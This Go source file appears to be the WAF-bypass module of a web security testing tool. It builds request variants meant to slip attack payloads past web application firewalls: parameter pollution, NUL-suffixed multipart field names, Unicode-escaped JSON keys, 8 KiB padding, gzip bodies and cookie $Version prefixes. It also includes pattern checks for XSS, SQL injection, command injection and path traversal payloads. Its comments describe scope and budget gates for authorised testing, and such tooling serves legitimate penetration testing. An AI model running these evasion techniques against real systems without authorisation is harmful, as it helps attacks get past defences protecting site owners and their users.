// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (C) 2026 Xmar1881 / GASH contributors
// Module: github.com/Xmar1881/Gash

package wafbypass

// Modern parser-discrepancy attempts. These are still bounded, aggressive-only
// variants: the caller applies the same PolicySession scope, budget, rate, and
// response-size gates as every other request. A variant is only a candidate;
// probe.VerifyApplicationBehavior must confirm a stable application response.

import (
	"bytes"
	"compress/gzip"
	"encoding/json"
	"net/url"
	"strconv"
	"strings"
)

// hppDifferentialAttempts sends a benign duplicate before the real value.
// Why: many WAFs inspect the first occurrence while PHP/Express/Flask-style
// backends take the last one. The existing generic HPP copies the same value;
// this is the first-wins/last-wins differential.
func hppDifferentialAttempts(rawURL string, headers map[string]string, body []byte) []Attempt {
	const capHPP = 2
	var out []Attempt
	if u, err := url.Parse(rawURL); err == nil && u.RawQuery != "" {
		if vals, perr := url.ParseQuery(u.RawQuery); perr == nil {
			for _, key := range sortedKeys(vals) {
				if len(vals[key]) == 0 || vals[key][0] == "" {
					continue
				}
				clone := make(url.Values, len(vals))
				for k, vs := range vals {
					clone[k] = append([]string{}, vs...)
				}
				clone[key] = append([]string{"gash-waf-benign"}, clone[key]...)
				nu := *u
				nu.RawQuery = clone.Encode()
				out = append(out, Attempt{
					Name:    "hpp-benign-first-query-" + sanitizeTechnique(key),
					URL:     nu.String(),
					Headers: cloneStrMap(headers),
					Body:    body,
				})
				break
			}
		}
	}
	if len(out) >= capHPP {
		return out
	}
	if !json.Valid(body) {
		if vals, err := url.ParseQuery(string(body)); err == nil && len(vals) > 0 {
			for _, key := range sortedKeys(vals) {
				if len(vals[key]) == 0 || vals[key][0] == "" {
					continue
				}
				clone := make(url.Values, len(vals))
				for k, vs := range vals {
					clone[k] = append([]string{}, vs...)
				}
				clone[key] = append([]string{"gash-waf-benign"}, clone[key]...)
				h := cloneStrMap(headers)
				h["Content-Type"] = "application/x-www-form-urlencoded"
				out = append(out, Attempt{
					Name:    "hpp-benign-first-body-" + sanitizeTechnique(key),
					URL:     rawURL,
					Headers: h,
					Body:    []byte(clone.Encode()),
				})
				break
			}
		}
	}
	return out
}

// multipartModernAttempts builds two parser-discrepancy multipart bodies:
// a NUL-suffixed field name and a filename-bearing field. Some WAF parsers
// reject/ignore the malformed name while the backend still maps it to the
// original field.
func multipartModernAttempts(rawURL string, headers map[string]string, body []byte) []Attempt {
	if json.Valid(body) {
		return nil
	}
	vals, err := url.ParseQuery(string(body))
	if err != nil || len(vals) == 0 {
		return nil
	}
	keys := sortedKeys(vals)
	target := ""
	for _, k := range keys {
		if len(vals[k]) > 0 && vals[k][0] != "" {
			target = k
			break
		}
	}
	if target == "" {
		return nil
	}
	const boundary = "----gashWafBoundary7d91"
	var out []Attempt
	for _, mode := range []string{"field-null", "field-filename"} {
		var b strings.Builder
		for _, k := range keys {
			name := k
			if k == target {
				switch mode {
				case "field-null":
					name = k + "\x00"
				case "field-filename":
					name = k
				}
			}
			for _, v := range vals[k] {
				b.WriteString("--" + boundary + "\r\n")
				b.WriteString(`Content-Disposition: form-data; name="` + name + `"`)
				if mode == "field-filename" && k == target {
					b.WriteString(`; filename="gash.txt"`)
				}
				b.WriteString("\r\n\r\n" + v + "\r\n")
			}
		}
		b.WriteString("--" + boundary + "--\r\n")
		h := cloneStrMap(headers)
		h["Content-Type"] = `multipart/form-data; boundary="` + boundary + `"`
		out = append(out, Attempt{
			Name:    "multipart-" + mode + "-" + sanitizeTechnique(target),
			URL:     rawURL,
			Headers: h,
			Body:    []byte(b.String()),
		})
	}
	return out
}

// jsonKeyAttempts escapes the target key (`id` -> `\u0069d`). AWS WAF and
// several virtual-patch rules match on the literal key while the backend's
// JSON decoder resolves the escaped form.
func jsonKeyAttempts(rawURL string, headers map[string]string, body []byte) []Attempt {
	var obj map[string]any
	if err := json.Unmarshal(body, &obj); err != nil || len(obj) == 0 {
		return nil
	}
	keys := make([]string, 0, len(obj))
	for k := range obj {
		keys = append(keys, k)
	}
	sortStrings(keys)
	for _, key := range keys {
		value, ok := obj[key].(string)
		if !ok || value == "" {
			continue
		}
		escapedKey, ok := jsonUnicodeString(key)
		if !ok {
			return nil
		}
		var b strings.Builder
		b.WriteByte('{')
		for i, k := range keys {
			if i > 0 {
				b.WriteByte(',')
			}
			renderedKey := k
			if k == key {
				renderedKey = escapedKey
			}
			kb, _ := json.Marshal(renderedKey)
			// json.Marshal escapes the backslashes of escapedKey; emit the
			// already-escaped raw token instead so the body carries \uXXXX.
			if k == key {
				b.WriteString(escapedKey)
			} else {
				b.Write(kb)
			}
			b.WriteByte(':')
			vb, _ := json.Marshal(obj[k])
			b.Write(vb)
		}
		b.WriteByte('}')
		h := cloneStrMap(headers)
		h["Content-Type"] = "application/json"
		return []Attempt{{
			Name:    "json-key-unicode-" + sanitizeTechnique(key),
			URL:     rawURL,
			Headers: h,
			Body:    []byte(b.String()),
		}}
	}
	return nil
}

// paddingAttempt places 8 KiB of benign data before the payload. WAFs with a
// fixed inspection window may stop before the payload while the backend parser
// still consumes the complete body. Only one bounded attempt is generated.
func paddingAttempt(rawURL string, headers map[string]string, body []byte) []Attempt {
	if len(body) == 0 || len(body) > 32*1024 {
		return nil
	}
	pad := strings.Repeat("A", 8*1024)
	if json.Valid(body) && len(bytesTrimSpace(body)) > 1 && bytesTrimSpace(body)[0] == '{' {
		trimmed := bytesTrimSpace(body)
		padded := make([]byte, 0, len(trimmed)+len(pad)+24)
		padded = append(padded, '{')
		padded = append(padded, []byte(`"gash_pad":"`+pad+`",`)...)
		padded = append(padded, trimmed[1:]...)
		h := cloneStrMap(headers)
		h["Content-Type"] = "application/json"
		return []Attempt{{
			Name:    "waf-padding-8k-json",
			URL:     rawURL,
			Headers: h,
			Body:    padded,
		}}
	}
	if vals, err := url.ParseQuery(string(body)); err == nil && len(vals) > 0 {
		h := cloneStrMap(headers)
		h["Content-Type"] = "application/x-www-form-urlencoded"
		return []Attempt{{
			Name:    "waf-padding-8k-form",
			URL:     rawURL,
			Headers: h,
			Body:    []byte("gash_pad=" + pad + "&" + string(body)),
		}}
	}
	return nil
}

func bytesTrimSpace(b []byte) []byte {
	return []byte(strings.TrimSpace(string(b)))
}

// headerValueAttempts mutates payload-bearing request headers such as
// Referer, User-Agent, Origin, and path-override headers. Query/body-only
// bypasses leave header injection points fully exposed to signature rules.
func headerValueAttempts(rawURL string, headers map[string]string, body []byte, class string, mutate func(string) []string) []Attempt {
	var names []string
	for name, value := range headers {
		lname := strings.ToLower(name)
		switch lname {
		case "content-type", "content-length", "host", "cookie", "authorization":
			continue
		}
		if headerPayloadLike(value, class) {
			names = append(names, name)
		}
	}
	sortStrings(names)
	var out []Attempt
	for _, name := range names {
		for i, variant := range mutate(headers[name]) {
			if variant == "" || variant == headers[name] {
				continue
			}
			h := cloneStrMap(headers)
			setHeader(h, name, variant)
			out = append(out, Attempt{
				Name:    "header-" + class + "-" + sanitizeTechnique(strings.ToLower(name)) + "-" + strconv.Itoa(i),
				URL:     rawURL,
				Headers: h,
				Body:    body,
			})
			if len(out) == 2 {
				return out
			}
		}
	}
	return out
}

func headerPayloadLike(value, class string) bool {
	lower := strings.ToLower(value)
	switch class {
	case "xss":
		return strings.Contains(lower, "<") || strings.Contains(lower, "alert(") ||
			strings.Contains(lower, "onerror") || strings.Contains(lower, "javascript:")
	case "sql":
		return strings.ContainsAny(value, `'"`) || strings.Contains(lower, "select") ||
			strings.Contains(lower, "union") || strings.Contains(lower, " or ") ||
			strings.Contains(lower, "sleep")
	case "cmd":
		return strings.ContainsAny(value, ";|&$`") || strings.Contains(lower, "sleep") ||
			strings.Contains(lower, "ping")
	case "path":
		return strings.Contains(lower, "..") || strings.Contains(lower, "etc/") ||
			strings.Contains(lower, "win.ini")
	case "url":
		return strings.Contains(lower, "://") || strings.HasPrefix(value, "//")
	default:
		return len(value) >= 8 && strings.ContainsAny(value, "<'\"`;|")
	}
}

func setHeader(m map[string]string, name, value string) {
	for k := range m {
		if strings.EqualFold(k, name) {
			delete(m, k)
		}
	}
	m[name] = value
}

// gzipAttempt sends the same body compressed. Some WAFs inspect the encoded
// bytes while the application still decompresses a normal gzip body.
func gzipAttempt(rawURL string, headers map[string]string, body []byte) []Attempt {
	if len(body) == 0 || len(body) > 32*1024 {
		return nil
	}
	for k := range headers {
		if strings.EqualFold(k, "Content-Encoding") {
			return nil
		}
	}
	var buf bytes.Buffer
	zw := gzip.NewWriter(&buf)
	if _, err := zw.Write(body); err != nil {
		return nil
	}
	if err := zw.Close(); err != nil {
		return nil
	}
	h := cloneStrMap(headers)
	h["Content-Encoding"] = "gzip"
	return []Attempt{{
		Name:    "gzip-body",
		URL:     rawURL,
		Headers: h,
		Body:    buf.Bytes(),
	}}
}

// cookieVersionAttempt prefixes the Cookie header with the legacy $Version
// attribute. Cookie parsers disagree about it; an app that ignores it keeps
// its session while a WAF parser may stop inspecting the following pairs.
func cookieVersionAttempt(rawURL string, headers map[string]string, body []byte) []Attempt {
	for name, value := range headers {
		if !strings.EqualFold(name, "Cookie") || strings.TrimSpace(value) == "" {
			continue
		}
		if strings.Contains(strings.ToLower(value), "$version") {
			return nil
		}
		h := cloneStrMap(headers)
		setHeader(h, "Cookie", "$Version=1; "+value)
		return []Attempt{{
			Name:    "cookie-version",
			URL:     rawURL,
			Headers: h,
			Body:    body,
		}}
	}
	return nil
}

func sortStrings(s []string) {
	for i := 1; i < len(s); i++ {
		for j := i; j > 0 && s[j] < s[j-1]; j-- {
			s[j], s[j-1] = s[j-1], s[j]
		}
	}
}

// deleteHeader removes a header case-insensitively.
func deleteHeader(m map[string]string, name string) {
	for k := range m {
		if strings.EqualFold(k, name) {
			delete(m, k)
		}
	}
}
